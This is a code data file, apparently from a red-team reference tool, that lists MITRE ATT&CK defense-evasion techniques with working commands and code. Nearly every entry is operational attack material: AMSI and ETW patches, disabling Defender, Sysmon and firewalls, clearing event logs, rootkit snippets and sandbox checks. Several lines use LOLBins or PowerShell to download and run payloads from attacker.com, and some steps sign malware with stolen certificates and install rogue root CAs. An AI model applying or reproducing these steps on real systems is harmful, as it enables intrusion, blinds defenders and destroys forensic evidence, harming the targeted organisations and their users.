import { EVASION } from "./evasion-phase";

export const DEFENSE_EVASION = {
  id: "defense-evasion",
  name: "Defense Evasion",
  tacticId: "TA0005",
  subtitle: "AMSI/ETW Bypass • Shellcode Gen • Process Injection • Loader Build • Masquerading • Obfuscation • LOLBins • File Deletion • Indicator Removal • Impair Defenses • Audit Log Disable • History Evasion • Disable Firewall • Weaken Encryption • Rootkit • Sandbox Evasion • Execution Guardrails • CrowdStrike/MDE/S1/Cortex/Elastic/ESET Bypass",
  color: "#60a5fa",
  techniques: [
    ...EVASION.techniques,
    {
      name: "Masquerading",
      id: "T1036",
      summary: "Process name spoofing • double extension • signed binary • PPID spoofing",
      description: "Disguise malicious code as legitimate software to evade detection",
      tags: ["PPID spoofing", "double extension", "signed binary", "T1036"],
      steps: [
        "PPID spoofing — make payload appear as child of legitimate process:\n# EDR/SIEM alert on: Word.exe → powershell.exe, mshta.exe → cmd.exe (unusual parent-child)\n# PPID spoofing changes what process appears as the parent in the event log\n# Payload cmd.exe appears to be spawned by explorer.exe — completely normal\n> STARTUPINFOEX si = {0};\n> SIZE_T size = 0;\n> InitializeProcThreadAttributeList(NULL, 1, 0, &size);\n> si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);\n> InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);\n> HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorer_pid);\n> UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);\n> CreateProcess(L\"cmd.exe\", NULL, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);\n# In Event ID 4688 / Sysmon 1: ParentImage = C:\\Windows\\explorer.exe — triggers no alert",
        "Binary name and path masquerading:\n# Many detection rules alert on process name + path mismatch\n# Legitimate svchost.exe lives in C:\\Windows\\System32\\ — copy there is suspicious (protected)\n# Use paths where copies are expected:\n$ copy payload.exe C:\\Windows\\Temp\\svchost.exe     # Looks like temp svchost\n$ copy payload.exe C:\\Users\\%USERNAME%\\AppData\\Roaming\\Teams\\Update.exe  # Mimics Teams updater\n# Best: pick process names that legitimately run from user-writable paths\n# OneDrive.exe, Teams.exe, Zoom.exe, Discord.exe all run from %LOCALAPPDATA%",
        "Double extension + icon masquerading (user-facing lures):\n# Windows hides known extensions by default — 'invoice_Q4.pdf.exe' shows as 'invoice_Q4.pdf'\n$ copy payload.exe 'invoice_Q4.pdf.exe'\n# Change icon to match extension: PDF icon → target thinks it's a PDF\n# Use ResourceHacker.exe to replace icon in payload binary\n# Advanced: Unicode Right-to-Left Override (U+202E) character reverses filename display\n# 'invoice_gpj.exe' → with RLO: 'invoiceexe.jpg' (appears as JPEG to user)\n# Combined: RLO + PDF icon + double extension = highly convincing lure",
        "Code signing with acquired/stolen certificate:\n# Signed binaries: bypassed by some AV products, lower risk score, user sees 'verified publisher'\n# Acquisition options: purchase EV cert, steal from compromised org, use leaked cert\n$ signtool sign /fd SHA256 /f stolen_cert.pfx /p cert_pass /t http://timestamp.comodoca.com/authenticode payload.exe\n# /t: add timestamp (important: signed binary stays valid even if cert later revoked)\n# Check cert validity BEFORE signing — revoked cert may trigger block\n# Verify signing: signtool verify /pa /v payload.exe\n# Note: some AV vendors specifically block certs known to be used by threat actors",
        "DLL sideloading — legitimate signed binary loads our malicious DLL:\n# Windows DLL search order: application directory first, then system dirs\n# If a SIGNED binary (e.g., OneDrive, Teams, Edge component) loads a DLL by name,\n# placing a DLL with that name in its directory makes it load our code instead\n# Find sideloading opportunities:\n$ python3 siofra.py --mode file --target 'C:\\Program Files\\OneDrive\\Update.exe' --dll-list dlls.txt\n# Common sideloading targets: version.dll, uxtheme.dll, winhttp.dll, cryptsp.dll\n# The signed binary loads → our DLL runs → signed binary continues normally (transparent)\n# Result: malicious code running under a legitimately-signed parent process"
      ]
    },
    {
      name: "Obfuscated Files or Information",
      id: "T1027",
      summary: "Base64 • XOR encryption • packing • steganography • compile-time obfuscation",
      description: "Encode, encrypt, or pack malicious content to evade signature-based detection",
      tags: ["Base64", "XOR", "packing", "obfuscation", "T1027"],
      steps: [
        "PowerShell obfuscation (Invoke-Obfuscation):\n$ powershell\n> Import-Module Invoke-Obfuscation\n> Invoke-Obfuscation\n> SET SCRIPTPATH C:\\payload.ps1\n> TOKEN\\ALL\\1  # Full token obfuscation\n> OUT C:\\obfuscated.ps1\n# Multiple layers: string splitting, encoding, backtick insertion",
        "XOR encrypted shellcode loader:\n> byte[] shellcode = new byte[] { 0xfc, 0x48, ... };\n> byte key = 0x41;\n> for (int i = 0; i < shellcode.Length; i++) shellcode[i] ^= key;  // Decrypt at runtime\n> // Then allocate memory and execute\n# Static signature of shellcode broken by XOR key",
        "PE packing with UPX or custom packer:\n$ upx --best --ultra-brute payload.exe -o packed.exe\n# UPX compresses PE - breaks static signatures\n# Custom packers encrypt sections with runtime decryption stub\n# Note: UPX is well-detected by AV - use custom packers",
        "Steganography - hide payload in image:\n$ steghide embed -cf innocent.jpg -ef payload.exe -p 'secretkey'\n# Payload hidden in JPEG pixel data\n# Delivery: send image, extract and execute on target\n$ steghide extract -sf innocent.jpg -p 'secretkey' -xf payload.exe",
        "String obfuscation in compiled code:\n> // Compile-time string encryption (e.g., with XorStr)\n> auto cmd = XORSTR(\"powershell -enc BASE64\");\n> // Or manually:\n> char enc[] = {0x70^0x10, 0x6f^0x10, ...};  // XOR with key 0x10\n> for(int i=0; i<sizeof(enc); i++) enc[i]^=0x10;\n> WinExec(enc, 0);"
      ]
    },
    {
      name: "System Binary Proxy Execution",
      id: "T1218",
      summary: "LOLBins: rundll32 • regsvr32 • mshta • certutil • wmic • msiexec",
      description: "Execute payloads using trusted Windows system binaries (Living off the Land)",
      tags: ["rundll32", "regsvr32", "mshta", "certutil", "T1218"],
      steps: [
        "rundll32.exe proxy execution:\n$ rundll32.exe shell32.dll,ShellExec_RunDLL calc.exe\n$ rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell\",0,true);\n$ rundll32.exe C:\\\\Windows\\\\System32\\\\advpack.dll,LaunchINFSection C:\\\\windows\\\\temp\\\\test.inf,DefaultInstall_SingleUser,1,\n# All use legitimate signed Windows binary",
        "regsvr32 / Squiblydoo:\n$ regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll\n# Fetches and executes .sct (scriptlet) file from remote URL\n# Signed Windows binary, bypasses AppLocker script rules\n# Squiblydoo technique - well documented but still used",
        "mshta.exe for remote execution:\n$ mshta.exe http://attacker.com/payload.hta\n$ mshta.exe vbscript:CreateObject(\"WScript.Shell\").Run(\"powershell -enc BASE64\")(window.close)\n# HTA runs in context of mshta.exe (signed Microsoft binary)\n# Often allowed through web proxies",
        "certutil for download and decode:\n$ certutil -urlcache -split -f http://attacker.com/payload.exe C:\\Windows\\Temp\\payload.exe\n$ certutil -decode payload.b64 payload.exe\n# Legitimate certificate utility abused for file download\n# Many AV products detect certutil download now",
        "wmic for remote execution:\n$ wmic /node:192.168.1.100 process call create \"powershell.exe -enc BASE64\"\n$ wmic os get /format:\"http://attacker.com/payload.xsl\"\n# XSL script processing via wmic - executes JScript/VBScript",
        "msiexec for payload execution:\n$ msiexec /q /i http://attacker.com/payload.msi\n$ msiexec /quiet /norestart /i payload.msi\n# MSI files executed by legitimate Windows installer\n# SYSTEM execution possible with AlwaysInstallElevated"
      ]
    },
    {
      name: "Indicator Removal",
      id: "T1070",
      summary: "Clear event logs • timestomping • prefetch deletion • bash history",
      description: "Remove forensic evidence of compromise to hinder incident response",
      tags: ["event logs", "timestomping", "prefetch", "T1070"],
      steps: [
        "Clear Windows event logs:\n$ wevtutil cl System\n$ wevtutil cl Security\n$ wevtutil cl Application\n$ wevtutil cl 'Windows PowerShell'\n$ wevtutil cl 'Microsoft-Windows-PowerShell/Operational'\n# Or via PowerShell:\n> Get-EventLog -List | ForEach { Clear-EventLog $_.Log }",
        "Timestomping (modify file timestamps):\n$ python3 timestomp.py -f payload.exe --modified '01/01/2020 00:00:00' --created '01/01/2020 00:00:00'\n# Mimikatz:\n$ Invoke-Mimikatz -Command '\"misc::timestomp\"'\n# Meterpreter:\n> timestomp payload.exe -m '01/01/2020 00:00:00'\n> timestomp payload.exe -c '01/01/2020 00:00:00'\n# Modified/Created/Access/MFT times can be set separately",
        "Delete prefetch and other artifacts:\n$ del /f /q C:\\Windows\\Prefetch\\PAYLOAD*.pf\n$ del /f /q C:\\Windows\\Temp\\*\n$ del /f /q %TEMP%\\*\n# Prefetch stores evidence of program execution\n# Can be disabled: reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters /v EnablePrefetcher /t REG_DWORD /d 0 /f",
        "Linux: clear bash history and logs:\n$ history -c && history -w\n$ cat /dev/null > ~/.bash_history\n$ shred -u ~/.bash_history\n$ echo '' > /var/log/auth.log\n$ echo '' > /var/log/syslog\n$ find /var/log -type f -exec truncate -s 0 {} \\;\n# Note: logs may be forwarded to SIEM before clearing",
        "Clear network artifacts:\n$ arp -d *  # Clear ARP cache (Windows)\n$ ip neigh flush all  # Linux ARP cache\n$ ipconfig /flushdns  # Clear DNS cache\n$ netsh winsock reset  # Reset Winsock catalog"
      ]
    },
    {
      name: "Impair Defenses",
      id: "T1562",
      summary: "Disable AV • firewall • EDR tampering • audit log disable • AMSI patch",
      description: "Disable or tamper with security tools to evade detection",
      tags: ["disable AV", "firewall", "EDR tampering", "AMSI", "T1562"],
      steps: [
        "Defender impairment — exclusion preferred over disable:\n# Outright disabling Defender generates immediate alerts in modern environments\n# Adding exclusions is stealthier — Defender stays running, just ignores our path/process\n$ Add-MpPreference -ExclusionPath 'C:\\Windows\\Temp'        # Exclude entire directory\n$ Add-MpPreference -ExclusionProcess 'payload.exe'          # Exclude specific process name\n$ Add-MpPreference -ExclusionExtension '.bin'               # Exclude all .bin files\n# If exclusions are blocked, disable only scanning components (not the whole service):\n$ Set-MpPreference -DisableRealtimeMonitoring $true\n$ Set-MpPreference -DisableIOAVProtection $true\n$ Set-MpPreference -DisableScriptScanning $true\n# Nuclear option (requires admin + likely triggers alert):\n$ net stop WinDefend && sc config WinDefend start= disabled",
        "AMSI bypass via memory patching (PowerShell pre-load):\n# AMSI scans all PS script content before execution — bypass MUST happen before loading detected tools\n# This patch writes 'mov eax, 0x80070057; ret' at AmsiScanBuffer entry point\n# 0x80070057 = E_INVALIDARG — causes AMSI to return 'clean' for all subsequent scans\n> $Win32 = @'\n>     [DllImport(\"kernel32\")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n>     [DllImport(\"kernel32\")] public static extern IntPtr LoadLibrary(string name);\n>     [DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n> '@\n> $a = Add-Type -MemberDefinition $Win32 -Name 'Api' -Namespace 'Win32' -PassThru\n> $amsi = [Win32.Api]::LoadLibrary('amsi.dll')\n> $addr = [Win32.Api]::GetProcAddress($amsi, 'AmsiScanBuffer')\n> $patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)  # mov eax, AMSI_RESULT_CLEAN; ret\n> [Win32.Api]::VirtualProtect($addr, [uint32]$patch.Length, 0x40, [ref]0)\n> [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, $patch.Length)\n# Test: IEX 'AMSI Test Sample 7e72c3ce-861b-4339-8740-0ac1484c1386' — should not alert after bypass\n# Note: bypass strings themselves are detected — obfuscate with string concat/encoding",
        "Firewall modification (targeted rules preferred):\n# Completely disabling the firewall = obvious indicator of compromise\n# Add specific outbound allow rule for C2 traffic instead:\n$ netsh advfirewall firewall add rule name='Windows Update' dir=out action=allow protocol=TCP remoteport=443 remoteip=ATTACKER_IP\n# Full disable (last resort, use only if needed):\n$ netsh advfirewall set allprofiles state off  # Windows\n$ iptables -F; iptables -P INPUT ACCEPT; iptables -P OUTPUT ACCEPT  # Linux\n# For C2: use port 443 (HTTPS) or 80 (HTTP) — almost always allowed outbound\n# DNS C2 (port 53 UDP) also typically allowed outbound everywhere",
        "ETW patching — blind security monitoring tools:\n# ETW (Event Tracing for Windows) is the logging backbone for Defender, many EDRs, and SIEM\n# Patching EtwEventWrite in the current process stops all ETW events from that process\n# Find EtwEventWrite in ntdll.dll, write 0xC3 (RET) as first byte:\n> var ntdll = System.Diagnostics.Process.GetCurrentProcess().Modules\n>     .Cast<System.Diagnostics.ProcessModule>()\n>     .First(m => m.ModuleName == \"ntdll.dll\");\n> var baseAddr = ntdll.BaseAddress;\n> // Resolve EtwEventWrite export offset from PE export table\n> // Write single 0xC3 byte (RET) — all subsequent ETW calls return immediately\n# Effect: no more ETW events from this PowerShell session\n# Detected by: EDR monitoring for write to EtwEventWrite address (rare)",
        "Sysmon and audit tool manipulation:\n# Sysmon provides process creation (Event 1), network (Event 3), file (Event 11) logging\n# Hard disable (requires admin + immediately obvious):\n$ net stop Sysmon64\n$ sc delete Sysmon64\n# Stealthier: add exclusion rule to Sysmon config for our process\n# Sysmon config location: HKLM\\SYSTEM\\CurrentControlSet\\Services\\SysmonDrv\\Parameters\\Rules\n# Modify config to exclude by process name:\n> Set-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SysmonDrv\\Parameters' -Name Rules -Value ([byte[]]$modified_config)\n# Alternative: process exclusion via Sysmon config XML update:\n$ sysmon64.exe -c updated_config.xml  # Reload config silently"
      ]
    },
    {
      name: "Hide Artifacts",
      id: "T1564",
      summary: "Hidden files • ADS • process hiding • hidden accounts • VHD containers",
      description: "Conceal malicious files, processes, and activities from system administrators",
      tags: ["hidden files", "ADS", "process hiding", "T1564"],
      steps: [
        "Hidden files and directories:\n$ attrib +h +s C:\\Windows\\Temp\\payload.exe  # Windows hidden+system\n$ mkdir .hidden && cp payload.sh .hidden/  # Linux hidden dir (dot prefix)\n$ attrib +h +s +r 'C:\\ProgramData\\Microsoft\\' # Abuse existing hidden dirs",
        "Alternate Data Streams (ADS) on NTFS:\n$ type payload.exe > legitimate.txt:payload.exe\n$ wscript.exe legitimate.txt:payload.js  # Execute from ADS\n$ powershell -c \"Get-Item -Path 'C:\\temp\\legitimate.txt' -Stream *\"\n# ADS not visible to normal dir listing\n# Payload stored in stream of innocent-looking file",
        "Process hiding via rootkit technique:\n> // Modify EPROCESS linked list to hide process from tools\n> // Find target EPROCESS block\n> PEPROCESS target = PsGetCurrentProcess();\n> // Unlink from PsActiveProcessHead list\n> RemoveEntryList(&target->ActiveProcessLinks);\n# Process disappears from Task Manager, PS output, Process Explorer\n# Kernel driver required",
        "Hide user account from logon screen:\n$ reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v backdooruser /t REG_DWORD /d 0 /f\n# User exists but not shown on Windows logon screen\n# Still accessible via runas or net user",
        "Hiding in container / VHD:\n$ fsutil file createNew stash.vhd 104857600\n# Create VHD container, mount, store tools/loot inside\n# Looks like innocuous file, contents hidden unless mounted\n$ diskpart: create vdisk file=stash.vhd maximum=100"
      ]
    },
    {
      name: "Reflective Code Loading",
      id: "T1620",
      summary: "In-memory execution • fileless malware • .NET assembly • reflective PE",
      description: "Execute payloads entirely in memory without writing to disk",
      tags: ["fileless", "in-memory", ".NET assembly", "T1620"],
      steps: [
        "PowerShell in-memory .NET assembly:\n> $data = (New-Object Net.WebClient).DownloadData('http://attacker.com/payload.exe')\n> $assem = [System.Reflection.Assembly]::Load($data)\n> $method = $assem.GetType('Namespace.Class').GetMethod('Main')\n> $method.Invoke(0, $null)\n# Never touches disk - loaded and executed from memory\n# Works for .NET assemblies (Mimikatz, SharpHound, etc.)",
        "Execute shellcode from URL (PowerShell):\n> $wc = New-Object System.Net.WebClient\n> $buf = $wc.DownloadData('http://attacker.com/shellcode.bin')\n> $handle = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($buf.Length)\n> [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $handle, $buf.Length)\n> $delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($handle, [System.Action])\n> $delegate.Invoke()\n# Downloads shellcode bytes, maps to executable memory, runs",
        "Donut for .NET to shellcode:\n$ donut -f payload.exe -o shellcode.bin -a 2\n# Convert any .NET assembly to position-independent shellcode\n# Inject shellcode into remote process via standard injection\n# Allows .NET tools to be used fileless in any process",
        "Execute from environment variables:\n> $env:COMSPEC = 'powershell.exe'\n> [System.Environment]::SetEnvironmentVariable('SHELLCODE', [Convert]::ToBase64String($shellcodeBytes))\n# Store shellcode in env var, retrieve and execute in child process\n# Avoids file writes and some AV scans",
        "Run .NET assembly via execute-assembly (Cobalt Strike):\n> execute-assembly Rubeus.exe kerberoast\n> execute-assembly SharpHound.exe -c all\n# Loads assembly into beacon's process memory\n# No disk write, output returned to operator\n# Standard technique for modern red team ops"
      ]
    },
    {
      name: "Modify Registry",
      id: "T1112",
      summary: "Registry persistence • hide values • RunKeys • COM hijack • disable tools",
      description: "Modify Windows Registry for evasion, persistence, and configuration changes",
      tags: ["registry", "RunKeys", "COM hijack", "T1112"],
      steps: [
        "Disable security features via registry:\n$ reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f\n$ reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f\n# Disables PowerShell script block logging",
        "Registry persistence locations:\n$ reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /d 'payload.exe' /f\n$ reg add HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe /v Debugger /d 'cmd.exe' /f\n$ reg add HKCU\\Environment /v UserInitMprLogonScript /d 'payload.bat' /f\n# Multiple registry persistence vectors",
        "Hiding registry values with null bytes:\n> // Use null byte in value name to hide from regedit\n> string hiddenKey = \"Malware\\0\";\n> RegistryKey key = Registry.CurrentUser.OpenSubKey(\"Software\", true);\n> key.SetValue(hiddenKey, \"payload.exe\");\n# Visible via raw registry access but hidden in regedit UI",
        "Modify registry to disable UAC:\n$ reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f\n$ reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f\n# Disables UAC completely - requires reboot",
        "COM registry hijack for evasion:\n$ reg add HKCU\\Software\\Classes\\CLSID\\{GUID}\\InprocServer32 /ve /d C:\\payload.dll /f\n$ reg add HKCU\\Software\\Classes\\CLSID\\{GUID}\\InprocServer32 /v ThreadingModel /d Apartment /f\n# User-level COM hijack: when app loads this COM object, our DLL loads\n# No admin required"
      ]
    },
    {
      name: "Rootkit",
      id: "T1014",
      summary: "Kernel rootkit • DKOM • hooking • UEFI rootkit • bootkits",
      description: "Use rootkit techniques to hide malicious code and activities at kernel level",
      tags: ["kernel rootkit", "DKOM", "hooking", "UEFI", "T1014"],
      steps: [
        "Kernel module rootkit (Linux):\n> #include <linux/module.h>\n> #include <linux/list.h>\n> MODULE_LICENSE(\"GPL\");\n> // Remove module from /proc/modules and sysfs\n> list_del_init(&THIS_MODULE->list);\n> kobject_del(&THIS_MODULE->mkobj.kobj);\n# Module becomes invisible to lsmod and /proc/modules\n$ insmod rootkit.ko  # Load rootkit module",
        "Direct Kernel Object Manipulation (DKOM):\n> // Hide process by unlinking from EPROCESS list\n> PEPROCESS process = FindProcessByPID(targetPID);\n> RemoveEntryList(&process->ActiveProcessLinks);\n# Process invisible to usermode tools\n# Still scheduled and running",
        "Syscall hooking to intercept system calls:\n> // Modify sys_call_table to point to hook function\n> original_read = sys_call_table[__NR_read];\n> sys_call_table[__NR_read] = hooked_read;  // Our function filters results\n# Filter filesystem reads to hide files\n# Filter process list to hide PIDs\n# SMEP/SMAP: modern kernels protect sys_call_table",
        "Windows SSDT hooking (legacy technique):\n> // System Service Descriptor Table hooking\n> PVOID originalFunc = SSDT->ServiceTable[syscallNumber];\n> SSDT->ServiceTable[syscallNumber] = (PVOID)HookFunction;\n# Intercept Windows syscalls at kernel level\n# PatchGuard (KPP) detects and BSOD on Windows 64-bit\n# Requires PatchGuard bypass",
        "eBPF-based stealth on modern Linux:\n$ bpftool prog load rootkit.o /sys/fs/bpf/rootkit\n# eBPF programs can hook tracepoints, intercept syscalls\n# More stealthy than kernel modules\n# Harder to detect than traditional rootkits"
      ]
    },
    {
      name: "Virtualization/Sandbox Evasion",
      id: "T1497",
      summary: "VM detection • timing attacks • user interaction • sleep • CPUID checks",
      description: "Detect and evade automated analysis environments, sandboxes, and security tools",
      tags: ["VM detection", "timing", "sandbox evasion", "T1497"],
      steps: [
        "VM/sandbox detection checks:\n> bool IsVirtualMachine() {\n>     // Check CPUID vendor\n>     int regs[4]; __cpuid(regs, 0);\n>     string vendor = string((char*)&regs[1], 4) + string((char*)&regs[3], 4) + string((char*)&regs[2], 4);\n>     if (vendor == \"VMwareVMware\" || vendor == \"VBoxVBoxVBox\" || vendor == \"KVMKVMKVM\") return true;\n>     // Check for sandbox artifacts: MAC address, registry, process names\n>     return false;\n> }",
        "User interaction checks:\n> // Only execute if user has moved mouse\n> POINT p1; GetCursorPos(&p1); Sleep(5000);\n> POINT p2; GetCursorPos(&p2);\n> if (p1.x == p2.x && p1.y == p2.y) exit(0);  // Sandbox: no mouse movement\n# Also check: foreground window changes, keyboard input\n# Sandboxes rarely simulate mouse movement",
        "Timing-based evasion:\n> DWORD start = GetTickCount();\n> Sleep(10000);  // Sleep 10 seconds\n> DWORD elapsed = GetTickCount() - start;\n> if (elapsed < 9000) exit(0);  // Sandbox accelerated time\n# Many sandboxes accelerate sleep calls\n# Actual elapsed time check defeats this",
        "Environment checks:\n$ # Check for sandbox-related processes\n$ tasklist | findstr -i 'vmsrvc\\|vmtoolsd\\|vboxservice\\|sandboxie\\|procmon\\|wireshark\\|fiddler'\n> // Check number of processes (sandboxes often have few)\n> if (processes.Count < 50) exit(0);\n> // Check disk size: sandboxes often have small virtual disks\n> if (disk_size_GB < 100) exit(0);\n# Real systems have many running processes",
        "WMIC and registry artifact checks:\n$ wmic bios get serialnumber | findstr -i 'vmware\\|vbox\\|qemu'\n$ reg query HKLM\\SOFTWARE\\VMware,Inc.\\\n$ reg query HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions\n$ dir 'C:\\Program Files\\VMware'\n# Registry and file artifacts from VM tools"
      ]
    },
    {
      name: "Subvert Trust Controls",
      id: "T1553",
      summary: "Code signing bypass • install root CA • disable SmartScreen • catalog file",
      description: "Undermine or bypass security controls based on trust verification",
      tags: ["code signing", "root CA", "SmartScreen", "T1553"],
      steps: [
        "Install malicious root certificate:\n$ certutil -addstore -enterprise Root malicious_ca.cer\n$ Import-Certificate -FilePath malicious_ca.cer -CertStoreLocation Cert:\\LocalMachine\\Root\n# All certificates signed by malicious CA are now trusted\n# Can issue valid HTTPS certificates for any domain",
        "Disable SmartScreen:\n$ reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer /v SmartScreenEnabled /t REG_SZ /d 'Off' /f\n$ Set-ItemProperty -Path HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppHost -Name EnableWebContentEvaluation -Value 0\n# SmartScreen checks file reputation - disable before payload delivery",
        "Mark of the Web removal:\n$ cmd /c 'more < payload.exe > payload_clean.exe'\n# Removes Zone.Identifier ADS that marks downloaded files\n> using var stream = File.Open(\"payload.exe\", FileMode.Open);\n> stream.DeleteFileStream(\"Zone.Identifier\");\n# Files from internet get MoTW - SmartScreen checks it\n# Removing MoTW bypasses SmartScreen check",
        "Catalog file bypass (Windows N-Day):\n# SIP (Subject Interface Package) controls code signing\n# Hijack SIP to bypass Authenticode verification\n$ reg add HKLM\\SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID} /v Dll /d 'C:\\payload.dll'\n# Custom SIP DLL intercepts signature verification",
        "SigCheck bypass with resource section:\n# Microsoft allows signed binaries to load from resource sections\n# Pack payload as resource in a legitimately signed binary\n# The binary stays validly signed despite the embedded payload\n# Use Resource Hacker to embed payload into a signed PE's resource section:\n$ ResourceHacker.exe -open signed.exe -save output.exe -action addoverwrite -res payload.bin -mask RCDATA,1,\n# Or embed with rc.exe + link step during custom loader build\n# SigCheck reports valid signature — payload hidden in resources"
      ]
    },
    {
      name: "Indirect Command Execution",
      id: "T1202",
      summary: "pcalua.exe • forfiles • explorer.exe • pcwrun.exe",
      description: "Execute commands via unusual parent processes to evade command-line monitoring",
      tags: ["pcalua.exe", "forfiles", "explorer.exe", "T1202"],
      steps: [
        "pcalua.exe (Program Compatibility Assistant) execution:\n$ pcalua.exe -a C:\\Windows\\temp\\payload.exe\n$ pcalua.exe -a calc.exe -c \"-exec calc.exe\"\n# Legitimate Windows binary, uncommon parent for security tools",
        "forfiles.exe:\n$ forfiles /p C:\\Windows\\System32 /m notepad.exe /c \"cmd.exe /c payload.exe\"\n# Uses forfiles to execute payload via cmd.exe\n# forfiles spawns cmd which spawns payload\n# Process chain: forfiles → cmd → payload",
        "explorer.exe shellexecute:\n$ explorer.exe /root, payload.exe\n$ explorer.exe C:\\Windows\\temp\\payload.exe\n# Explorer opens/executes file\n# Payload appears as child of explorer.exe",
        "pcwrun.exe (Program Compatibility Wizard):\n$ pcwrun.exe C:\\Windows\\temp\\payload.exe\n# Executes file via compatibility wizard\n# Uncommon execution vector, may bypass detection",
        "SyncAppvPublishingServer.exe (AppV) proxy:\n$ SyncAppvPublishingServer.exe \"n; Start-Process powershell -ArgumentList '-enc BASE64'\"\n# PowerShell execution via App-V publishing server\n# AppLocker bypass: SyncAppvPublishingServer.vbs often allowed"
      ]
    },
    {
      name: "Template Injection",
      id: "T1221",
      summary: "Remote Office template • OLE • macro via normal.dotm remote",
      description: "Inject malicious content into Office documents via remote template loading",
      tags: ["remote template", "OLE injection", "normal.dotm", "T1221"],
      steps: [
        "Word remote template injection:\n# Create malicious .dotm template with macro:\n# Upload to attacker server\n# Modify target .docx to reference remote template:\n# Use python-docx or manual zip edit to inject remote template:\n$ python3 -c \"\nimport zipfile, shutil, os\nshutil.copy('document.docx','modified.docx')\n# Edit word/_rels/settings.xml.rels to set Target to https://attacker.com/evil.dotm\n\"\n# When victim opens docx, Word fetches and loads remote template\n# Macro in template executes automatically",
        "Modify docx relationships file:\n# Unzip docx file:\n$ unzip document.docx -d document_extracted/\n$ cat document_extracted/word/_rels/settings.xml.rels\n> <Relationship Type=\".../settings\" Target=\"https://attacker.com/evil.dotm\"/>\n# Edit target URL, rezip:\n$ cd document_extracted && zip -r ../document_modified.docx .\n# Template loads from attacker URL on open",
        "OLE object injection via oleObject relationship:\n# Unzip the docx, add OLE object relationship manually:\n$ unzip document.docx -d doc_extracted/\n# Edit word/_rels/document.xml.rels to add an oleObject entry pointing to a .bin payload\n# Or use python-docx to embed an OLE package object:\n> from docx import Document\n> from docx.oxml.ns import qn\n> from docx.oxml import OxmlElement\n> doc = Document('template.docx')\n> # Embed payload as OLE Package object (icon-activated)\n> # oleObject element: ProgID='Package', r:id points to embedded payload part\n# Repack: cd doc_extracted && zip -r ../document_modified.docx .\n# When user double-clicks the embedded icon, payload executes\n# Disguise icon as PDF, Excel chart, or legitimate document",
        "Excel template with XLSM remote:\n# Similar to Word template injection\n# Excel adds-in and templates execute macros on open\n# .xlam (Excel Add-In) can be loaded remotely",
        "HTML/RTF template injection:\n# RTF files with \\objupdate can auto-execute linked objects\n# HTML email with remote template reference\n# Used in phishing to maintain server-side control of payload"
      ]
    },
    {
      name: "Deobfuscate/Decode Files or Information",
      id: "T1140",
      summary: "Base64 decode • XOR decrypt • runtime unpacking • certutil decode",
      description: "Decode and deobfuscate malicious content at runtime to evade static analysis",
      tags: ["base64 decode", "XOR decrypt", "runtime unpack", "T1140"],
      steps: [
        "Base64 decode at runtime (PowerShell):\n$ powershell -enc BASE64ENCODED_COMMAND\n# -enc: decode and execute base64 command\n# One of the most common obfuscation methods\n$ echo BASE64 | base64 -d | bash  # Linux equivalent",
        "certutil base64 decode:\n$ certutil -decode encoded.b64 output.exe\n$ certutil -urlcache -split -f http://attacker.com/encoded.b64 C:\\Temp\\enc.b64\n$ certutil -decode C:\\Temp\\enc.b64 C:\\Temp\\payload.exe\n# Use Windows built-in tool to decode and deliver payload",
        "Runtime XOR decryption:\n> byte[] payload = new byte[] {0xFC^0x41, 0x48^0x41, ...};\n> byte key = 0x41;\n> for (int i = 0; i < payload.Length; i++) payload[i] ^= key;\n> // Execute decrypted shellcode\n# XOR with simple key bypasses static signature",
        "PowerShell compressed and encoded script:\n> $compressed = [Convert]::FromBase64String('BASE64_OF_GZIPPED_SCRIPT')\n> $stream = New-Object IO.MemoryStream(,$compressed)\n> $decompressed = New-Object IO.Compression.GZipStream($stream, [IO.Compression.CompressionMode]::Decompress)\n> $reader = New-Object IO.StreamReader($decompressed)\n> IEX $reader.ReadToEnd()\n# Gzipped+base64 encoded script decompressed at runtime",
